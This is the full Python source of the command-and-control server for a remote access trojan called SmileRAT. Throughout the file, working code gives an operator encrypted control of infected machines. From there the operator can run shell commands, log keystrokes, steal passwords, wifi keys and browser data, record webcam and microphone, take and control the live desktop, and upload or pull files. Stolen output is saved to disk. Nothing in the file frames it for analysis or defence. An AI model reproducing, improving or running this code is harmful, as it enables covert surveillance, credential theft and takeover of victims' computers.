#!/usr/bin/env python3
"""
C2 Server for SmileRAT — complete
  Layers 1 + 2 + 3  (framing, AES-GCM, file transfer)
  Extras: mouse, keyboard, RD stream, webcam, mic, stealer, live viewer
  v4.1: added `file`, `mouse`, `keyboard` as top-level commands
"""

import socket
import threading
import struct
import time
import os
import sys
import base64
import secrets
import queue

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

try:
    from colorama import init, Fore
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = BLUE = CYAN = MAGENTA = WHITE = RESET = ''

try:
    import rd_viewer
    HAS_VIEWER = True
except ImportError:
    HAS_VIEWER = False

HOST = "0.0.0.0"
PORT = 4444
MSG_MAX = 16 * 1024 * 1024
NONCE_LEN = 12
TAG_LEN = 16


# ==================== SESSION ====================
class Session:
    def __init__(self, sock):
        self.sock = sock
        self.key = secrets.token_bytes(32)
        self.aes = AESGCM(self.key)
        self.send_counter = 0
        self.recv_counter = 0

    def handshake(self):
        self.sock.sendall(struct.pack(">I", 32) + self.key)
        ack = self.recv_msg()
        return ack == "READY"

    def send_msg(self, payload: str):
        plaintext = payload.encode("utf-8", errors="replace")
        nonce = self._make_nonce(self.send_counter)
        self.send_counter += 1
        ct_and_tag = self.aes.encrypt(nonce, plaintext, None)
        blob = nonce + ct_and_tag
        self.sock.sendall(struct.pack(">I", len(blob)) + blob)

    def recv_msg(self):
        header = b""
        while len(header) < 4:
            chunk = self.sock.recv(4 - len(header))
            if not chunk:
                return None
            header += chunk
        (length,) = struct.unpack(">I", header)
        if length < NONCE_LEN + TAG_LEN or length > MSG_MAX:
            return None
        blob = b""
        while len(blob) < length:
            chunk = self.sock.recv(length - len(blob))
            if not chunk:
                return None
            blob += chunk
        nonce = blob[:NONCE_LEN]
        ct = blob[NONCE_LEN:]
        try:
            plaintext = self.aes.decrypt(nonce, ct, None)
        except Exception:
            return None
        self.recv_counter += 1
        return plaintext.decode("utf-8", errors="replace")

    @staticmethod
    def _make_nonce(counter: int) -> bytes:
        head = struct.pack("<Q", counter)
        tail_val = (counter ^ (counter >> 32)) & 0xFFFFFFFF
        tail = struct.pack("<I", tail_val)
        return head + tail


# ==================== SERVER ====================
class C2Server:
    def __init__(self, host=HOST, port=PORT):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = {}
        self.running = False
        self.client_counter = 0
        self.lock = threading.Lock()

    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            self.running = True

            viewer_status = "viewer ready" if HAS_VIEWER else "viewer OFF (install Pillow)"
            print(f"""{Fore.CYAN}
  ╔════════════════════════════════════════╗
  ║   SmileRAT C2 v4.1 (AES + Full Cmds)   ║
  ║        {self.host}:{self.port}                     ║
  ║        {viewer_status:<31}║
  ╚════════════════════════════════════════╝{Fore.RESET}
{Fore.RED}  Type 'help' for commands{Fore.RESET}
""")
            print(f"{Fore.GREEN}[+] C2 listening on {self.host}:{self.port}{Fore.RESET}")

            t = threading.Thread(target=self.accept_clients, daemon=True)
            t.start()
            self.command_line()
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Fore.RESET}")
            sys.exit(1)

    def accept_clients(self):
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                self.client_counter += 1
                cid = self.client_counter

                session = Session(client_socket)
                if not session.handshake():
                    print(f"{Fore.RED}[-] Client {cid} failed handshake{Fore.RESET}")
                    client_socket.close()
                    continue

                with self.lock:
                    self.clients[cid] = {
                        "session": session,
                        "ip": addr[0],
                        "port": addr[1],
                        "connected": True,
                        "last_seen": time.time(),
                        "info": None,
                        "downloading": None,
                        "rd_streaming": False,
                        "rd_queue": None,
                    }

                print(f"\n{Fore.GREEN}[+] Client [{cid}] connected (encrypted) from {addr[0]}:{addr[1]}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)

                t = threading.Thread(target=self.handle_client, args=(cid,), daemon=True)
                t.start()
            except Exception as e:
                if self.running:
                    print(f"{Fore.RED}[-] Accept error: {e}{Fore.RESET}")

    def handle_client(self, cid):
        with self.lock:
            client = self.clients.get(cid)
        if not client:
            return
        session = client["session"]

        while self.running and client["connected"]:
            msg = session.recv_msg()
            if msg is None:
                break
            with self.lock:
                self.clients[cid]["last_seen"] = time.time()

            # ---------- FDOWNLOAD ----------
            if msg.startswith("FDOWNLOAD|"):
                parts = msg.split("|", 2)
                with self.lock:
                    if cid in self.clients:
                        self.clients[cid]["downloading"] = {
                            "path": parts[1],
                            "total": int(parts[2]) if len(parts) > 2 else 0,
                            "chunks": {},
                        }
                print(f"\n{Fore.YELLOW}[*] Incoming file: {parts[1]}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            if msg.startswith("FCHUNK|"):
                with self.lock:
                    dl = self.clients.get(cid, {}).get("downloading")
                if dl:
                    parts = msg.split("|", 3)
                    try:
                        idx = int(parts[1])
                        dl["chunks"][idx] = base64.b64decode(parts[3])
                        got = sum(len(c) for c in dl["chunks"].values())
                        pct = (got / dl["total"] * 100) if dl["total"] else 0
                        print(f"\r{Fore.CYAN}[*] {got}/{dl['total']} ({pct:.1f}%){Fore.RESET}", end="", flush=True)
                    except Exception:
                        pass
                continue

            if msg.startswith("FDOWNLOAD_DONE|"):
                with self.lock:
                    dl = self.clients.get(cid, {}).get("downloading")
                    if cid in self.clients:
                        self.clients[cid]["downloading"] = None
                if dl:
                    os.makedirs("downloads", exist_ok=True)
                    fname = os.path.basename(dl["path"].replace("\\", "/")) or "file.bin"
                    out_path = os.path.join("downloads", fname)
                    with open(out_path, "wb") as f:
                        for i in sorted(dl["chunks"].keys()):
                            f.write(dl["chunks"][i])
                    total = os.path.getsize(out_path)
                    print(f"\n{Fore.GREEN}[+] Download complete: {out_path} ({total} bytes){Fore.RESET}")
                    print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            # ---------- STEAL ----------
            if msg.startswith("STEAL_OUTPUT|"):
                content = msg[len("STEAL_OUTPUT|"):]
                os.makedirs("steal", exist_ok=True)
                fname = f"steal_{cid}_{int(time.time())}.txt"
                fpath = os.path.join("steal", fname)
                with open(fpath, "w", encoding="utf-8") as f:
                    f.write(content)
                print(f"\n{Fore.GREEN}[+] Stealer output saved: {fpath}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            if msg.startswith("STEAL_ERR|"):
                print(f"\n{Fore.RED}[-] {msg}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            # ---------- FILE ops reply ----------
            if msg.startswith("FILE_"):
                print(f"\n{Fore.CYAN}[Client {cid}] {msg}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            # ---------- FUPLOAD ----------
            if msg.startswith("FUPLOAD_"):
                color = Fore.GREEN if "OK" in msg else (Fore.RED if "ERR" in msg else Fore.YELLOW)
                print(f"\n{color}[*] {msg}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            # ---------- RDFRAME ----------
            if msg.startswith("RDFRAME|"):
                parts = msg.split("|", 2)
                if len(parts) == 3:
                    try:
                        jpeg = base64.b64decode(parts[2])
                    except Exception:
                        jpeg = b""
                    with self.lock:
                        q = self.clients.get(cid, {}).get("rd_queue") if cid in self.clients else None
                    if q is not None and jpeg:
                        try:
                            q.put_nowait(jpeg)
                        except queue.Full:
                            try:
                                q.get_nowait()
                            except queue.Empty:
                                pass
                            try:
                                q.put_nowait(jpeg)
                            except queue.Full:
                                pass
                    elif jpeg:
                        os.makedirs("rd_frames", exist_ok=True)
                        fpath = os.path.join("rd_frames",
                                             f"frame_{cid}_{int(time.time())}.jpg")
                        with open(fpath, "wb") as f:
                            f.write(jpeg)
                continue

            if msg.startswith("RD_ERR|") or msg.startswith("RD_OK|"):
                color = Fore.RED if "ERR" in msg else Fore.GREEN
                print(f"\n{color}[*] {msg}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            # ---------- WEBCAM ----------
            if msg.startswith("WEBCAM_DATA|"):
                parts = msg.split("|", 2)
                if len(parts) == 3:
                    try:
                        data = base64.b64decode(parts[2])
                        os.makedirs("webcam", exist_ok=True)
                        fname = f"webcam_{cid}_{int(time.time())}.jpg"
                        fpath = os.path.join("webcam", fname)
                        with open(fpath, "wb") as f:
                            f.write(data)
                        print(f"\n{Fore.GREEN}[+] Webcam frame saved: {fpath} ({len(data)} bytes){Fore.RESET}")
                    except Exception as e:
                        print(f"\n{Fore.RED}[-] Webcam decode error: {e}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            if msg.startswith("WEBCAM_ERR|"):
                print(f"\n{Fore.RED}[-] {msg}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            # ---------- MICROPHONE ----------
            if msg.startswith("MICROPHONE_DATA|"):
                parts = msg.split("|", 2)
                if len(parts) == 3:
                    try:
                        data = base64.b64decode(parts[2])
                        os.makedirs("mic", exist_ok=True)
                        fname = f"mic_{cid}_{int(time.time())}.wav"
                        fpath = os.path.join("mic", fname)
                        with open(fpath, "wb") as f:
                            f.write(data)
                        print(f"\n{Fore.GREEN}[+] Microphone recording saved: {fpath} ({len(data)} bytes){Fore.RESET}")
                    except Exception as e:
                        print(f"\n{Fore.RED}[-] Mic decode error: {e}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            if msg.startswith("MICROPHONE_ERR|"):
                print(f"\n{Fore.RED}[-] {msg}{Fore.RESET}")
                print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)
                continue

            # ---------- MOUSE / KEYBOARD ack ----------
            if msg == "MOUSE_OK" or msg == "KEYBOARD_OK":
                # Ack events — don't spam the console
                continue

            # ---------- INFO ----------
            if msg.startswith("INFO|"):
                with self.lock:
                    self.clients[cid]["info"] = msg

            print(f"\n{Fore.BLUE}[Client {cid}] {msg}{Fore.RESET}")
            print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)

        with self.lock:
            if cid in self.clients:
                self.clients[cid]["connected"] = False
                try:
                    self.clients[cid]["session"].sock.close()
                except Exception:
                    pass
                del self.clients[cid]
        print(f"\n{Fore.RED}[-] Client [{cid}] disconnected{Fore.RESET}")
        print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)

    def send_command(self, cid, command):
        with self.lock:
            client = self.clients.get(cid)
        if not client or not client["connected"]:
            return False
        try:
            client["session"].send_msg(command)
            return True
        except Exception:
            return False

    # ==================== LIVE VIEWER ====================
    def rd_view(self, args):
        if not HAS_VIEWER:
            print(f"{Fore.RED}[-] Viewer unavailable. Install Pillow:")
            print(f"    pip install Pillow{Fore.RESET}")
            return
        if not args:
            print(f"{Fore.RED}[-] Usage: rd_view <id>{Fore.RESET}")
            return
        try:
            cid = int(args[0])
        except ValueError:
            print(f"{Fore.RED}[-] Invalid ID{Fore.RESET}")
            return

        with self.lock:
            client = self.clients.get(cid)
        if not client or not client["connected"]:
            print(f"{Fore.RED}[-] Client not found{Fore.RESET}")
            return

        q = queue.Queue(maxsize=8)
        with self.lock:
            self.clients[cid]["rd_queue"] = q

        self.send_command(cid, "rd_start")
        print(f"{Fore.GREEN}[+] Stream requested from {cid}. Opening viewer...{Fore.RESET}")

        def send_mouse(viewer_cid, x, y, btn, wheel):
            self.send_command(viewer_cid, f"mouse {x} {y} {btn} {wheel}")

        def send_keyboard(viewer_cid, vk, down):
            self.send_command(viewer_cid, f"keyboard {vk} {down}")

        def on_close(viewer_cid, stop_stream=True):
            if stop_stream:
                self.send_command(viewer_cid, "rd_stop")
            with self.lock:
                if viewer_cid in self.clients:
                    self.clients[viewer_cid]["rd_queue"] = None
            print(f"\n{Fore.YELLOW}[*] Viewer for {viewer_cid} closed{Fore.RESET}")
            print(f"{Fore.CYAN}C2> {Fore.RESET}", end="", flush=True)

        t = threading.Thread(
            target=rd_viewer.launch_viewer,
            args=(cid, q, send_mouse, send_keyboard, on_close),
            daemon=True)
        t.start()

    # ==================== SERVER COMMANDS ====================
    def show_help(self, args=None):
        print(f"""{Fore.CYAN}
Server:  list | interact <id> | broadcast <cmd> | stats | clear | exit

Live remote desktop:
  rd_view <id>                       Open live viewer window (mouse+keyboard)
  rd_stop <id>                       Stop streaming
  rd_frame <id>                      Request one frame (saves to disk)
  rd_settings <id> fps=<n> quality=<n>

Direct client commands:
  system <id>
  shell <id> <cmd>
  screenshot <id>
  keylog <id> start|stop|get
  steal <id> passwords|wifi|browser|all
  webcam <id>
  microphone <id> [seconds]
  file <id> <op> <path> [dest]       ops: list|delete|copy|move|mkdir|rmdir
  mouse <id> <x_pct> <y_pct> <btn> <wheel>
  keyboard <id> <vk_code> <down>
  fdownload <id> <remote_path>
  fupload <id> <local_path> <remote_path>

Interactive:  interact <id>
{Fore.RESET}""")

    def list_clients(self, args=None):
        with self.lock:
            if not self.clients:
                print(f"{Fore.YELLOW}[-] No clients{Fore.RESET}")
                return
            print(f"\n{Fore.CYAN}Clients:{Fore.RESET}")
            print(f"{'ID':>4} | {'IP':<16} | {'Info':<40}")
            print("-" * 70)
            for cid, c in self.clients.items():
                info = (c.get("info") or "")[:40]
                print(f"{cid:>4} | {c['ip']:<16} | {info}")

    def interact_with_client(self, args):
        if not args:
            print(f"{Fore.RED}[-] Usage: interact <id>{Fore.RESET}")
            return
        try:
            cid = int(args[0])
        except ValueError:
            print(f"{Fore.RED}[-] Invalid ID{Fore.RESET}")
            return
        with self.lock:
            client = self.clients.get(cid)
        if not client or not client["connected"]:
            print(f"{Fore.RED}[-] Client not found{Fore.RESET}")
            return
        print(f"{Fore.GREEN}[+] Interacting with {cid} ({client['ip']}){Fore.RESET}")
        print(f"{Fore.YELLOW}Type 'back' to return{Fore.RESET}")
        while True:
            try:
                cmd = input(f"{Fore.BLUE}[Client {cid}]> {Fore.RESET}").strip()
                if not cmd:
                    continue
                if cmd.lower() == "back":
                    break
                self.send_command(cid, cmd)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Fore.RED}[-] {e}{Fore.RESET}")
                break

    def broadcast_command(self, args):
        if not args:
            print(f"{Fore.RED}[-] Usage: broadcast <cmd>{Fore.RESET}")
            return
        command = " ".join(args)
        with self.lock:
            ids = [cid for cid, c in self.clients.items() if c["connected"]]
        sent = sum(1 for cid in ids if self.send_command(cid, command))
        print(f"{Fore.GREEN}[+] Sent to {sent}{Fore.RESET}")

    def show_stats(self, args=None):
        with self.lock:
            online = sum(1 for c in self.clients.values() if c["connected"])
        print(f"{Fore.CYAN}Total: {self.client_counter} | Active: {len(self.clients)} | Online: {online}{Fore.RESET}")

    def clear_screen(self, args=None):
        os.system("clear" if sys.platform != "win32" else "cls")

    # ---------- Convenience wrappers ----------
    def _direct(self, args, prefix, usage):
        if not args:
            print(f"{Fore.RED}[-] Usage: {usage}{Fore.RESET}")
            return
        try:
            cid = int(args[0])
        except ValueError:
            print(f"{Fore.RED}[-] Invalid ID{Fore.RESET}")
            return
        with self.lock:
            client = self.clients.get(cid)
        if not client or not client["connected"]:
            print(f"{Fore.RED}[-] Client not found{Fore.RESET}")
            return
        payload = prefix + " ".join(args[1:]) if len(args) > 1 else prefix.strip()
        self.send_command(cid, payload)
        print(f"{Fore.YELLOW}[*] Sent to {cid}: {payload}{Fore.RESET}")

    def cmd_system(self, args):     self._direct(args, "system ",     "system <id>")
    def cmd_shell(self, args):      self._direct(args, "shell ",      "shell <id> <cmd>")
    def cmd_screenshot(self, args): self._direct(args, "screenshot ", "screenshot <id>")
    def cmd_keylog(self, args):     self._direct(args, "keylog ",     "keylog <id> start|stop|get")
    def cmd_steal(self, args):      self._direct(args, "steal ",      "steal <id> passwords|wifi|browser|all")
    def cmd_webcam(self, args):     self._direct(args, "webcam ",     "webcam <id>")
    def cmd_microphone(self, args): self._direct(args, "microphone ", "microphone <id> [seconds]")

    # ---------- NEW: file, mouse, keyboard ----------
    def cmd_file(self, args):
        """file <id> <op> <path> [dest]"""
        if len(args) < 3:
            print(f"{Fore.RED}[-] Usage: file <id> <op> <path> [dest]{Fore.RESET}")
            print(f"    ops: list | delete | copy | move | mkdir | rmdir")
            return
        # Pass the rest through as-is (op + path + optional dest)
        self._direct(args, "file ", "file <id> <op> <path> [dest]")

    def cmd_mouse(self, args):
        """mouse <id> <x_pct> <y_pct> <btn> <wheel>"""
        if len(args) < 5:
            print(f"{Fore.RED}[-] Usage: mouse <id> <x_pct> <y_pct> <btn> <wheel>{Fore.RESET}")
            print(f"    btn: 0=none 1=left 2=right 3=middle   wheel: +/- 120 per notch")
            return
        try:
            int(args[0]); int(args[1]); int(args[2]); int(args[3]); int(args[4])
        except ValueError:
            print(f"{Fore.RED}[-] All 4 args after <id> must be integers{Fore.RESET}")
            return
        self._direct(args, "mouse ", "mouse <id> <x> <y> <btn> <wheel>")

    def cmd_keyboard(self, args):
        """keyboard <id> <vk_code> <down>"""
        if len(args) < 3:
            print(f"{Fore.RED}[-] Usage: keyboard <id> <vk_code> <down>{Fore.RESET}")
            print(f"    vk_code: 65='A'  13=Enter  8=Backspace  32=Space  27=Esc")
            print(f"    down: 1=press  0=release")
            return
        try:
            int(args[0]); int(args[1]); int(args[2])
        except ValueError:
            print(f"{Fore.RED}[-] All args after <id> must be integers{Fore.RESET}")
            return
        self._direct(args, "keyboard ", "keyboard <id> <vk> <down>")

    # ---------- RD control ----------
    def cmd_rd_stop(self, args):
        self._direct(args, "rd_stop ", "rd_stop <id>")
        if args:
            try:
                cid = int(args[0])
                with self.lock:
                    if cid in self.clients:
                        self.clients[cid]["rd_streaming"] = False
                        self.clients[cid]["rd_queue"] = None
            except ValueError:
                pass

    def cmd_rd_frame(self, args):
        self._direct(args, "rd_frame ", "rd_frame <id>")

    def cmd_rd_settings(self, args):
        self._direct(args, "rd_settings ", "rd_settings <id> fps=<n> quality=<n>")

    # ---------- File transfer ----------
    def fdownload(self, args):
        if len(args) < 2:
            print(f"{Fore.RED}[-] Usage: fdownload <id> <remote_path>{Fore.RESET}")
            return
        try:
            cid = int(args[0])
        except ValueError:
            print(f"{Fore.RED}[-] Invalid ID{Fore.RESET}")
            return
        remote_path = " ".join(args[1:])
        with self.lock:
            client = self.clients.get(cid)
        if not client or not client["connected"]:
            print(f"{Fore.RED}[-] Client not found{Fore.RESET}")
            return
        self.send_command(cid, "fdownload " + remote_path)
        print(f"{Fore.YELLOW}[*] Requested {remote_path} from client {cid}{Fore.RESET}")

    def fupload(self, args):
        if len(args) < 3:
            print(f"{Fore.RED}[-] Usage: fupload <id> <local_path> <remote_path>{Fore.RESET}")
            return
        try:
            cid = int(args[0])
        except ValueError:
            print(f"{Fore.RED}[-] Invalid ID{Fore.RESET}")
            return
        local_path = args[1]
        remote_path = " ".join(args[2:])
        try:
            with open(local_path, "rb") as f:
                data = f.read()
        except Exception as e:
            print(f"{Fore.RED}[-] Cannot read {local_path}: {e}{Fore.RESET}")
            return
        with self.lock:
            client = self.clients.get(cid)
        if not client or not client["connected"]:
            print(f"{Fore.RED}[-] Client not found{Fore.RESET}")
            return
        self.send_command(cid, "fupload " + remote_path)
        time.sleep(0.2)
        CHUNK = 512 * 1024
        index = 0
        for off in range(0, len(data), CHUNK):
            chunk = data[off:off+CHUNK]
            b64 = base64.b64encode(chunk).decode()
            msg = f"FUPLOAD_CHUNK|{index}|{len(chunk)}|{b64}"
            self.send_command(cid, msg)
            index += 1
        self.send_command(cid, f"FUPLOAD_DONE|{index}")
        print(f"{Fore.GREEN}[+] Uploaded {len(data)} bytes to client {cid} as {remote_path}{Fore.RESET}")

    # ==================== MAIN LOOP ====================
    def shutdown(self, args=None):
        self.running = False
        with self.lock:
            for c in self.clients.values():
                try:
                    c["session"].sock.close()
                except Exception:
                    pass
        if self.server_socket:
            self.server_socket.close()
        sys.exit(0)

    def command_line(self):
        cmds = {
            "help": self.show_help,
            "list": self.list_clients,
            "interact": self.interact_with_client,
            "broadcast": self.broadcast_command,
            "stats": self.show_stats,
            "clear": self.clear_screen,
            "system": self.cmd_system,
            "shell": self.cmd_shell,
            "screenshot": self.cmd_screenshot,
            "keylog": self.cmd_keylog,
            "steal": self.cmd_steal,
            "webcam": self.cmd_webcam,
            "microphone": self.cmd_microphone,
            "file": self.cmd_file,
            "mouse": self.cmd_mouse,
            "keyboard": self.cmd_keyboard,
            "rd_view": self.rd_view,
            "rd_stop": self.cmd_rd_stop,
            "rd_frame": self.cmd_rd_frame,
            "rd_settings": self.cmd_rd_settings,
            "fdownload": self.fdownload,
            "fupload": self.fupload,
            "exit": self.shutdown,
            "quit": self.shutdown,
        }
        while self.running:
            try:
                line = input(f"{Fore.CYAN}C2> {Fore.RESET}").strip()
                if not line:
                    continue
                parts = line.split()
                name = parts[0].lower()
                if name in cmds:
                    cmds[name](parts[1:])
                else:
                    print(f"{Fore.RED}[-] Unknown: {name}{Fore.RESET}")
            except KeyboardInterrupt:
                self.shutdown()
            except Exception as e:
                print(f"{Fore.RED}[-] {e}{Fore.RESET}")


def main():
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-H", "--host", default=HOST)
    p.add_argument("-p", "--port", type=int, default=PORT)
    a = p.parse_args()
    C2Server(host=a.host, port=a.port).start()


if __name__ == "__main__":
    main()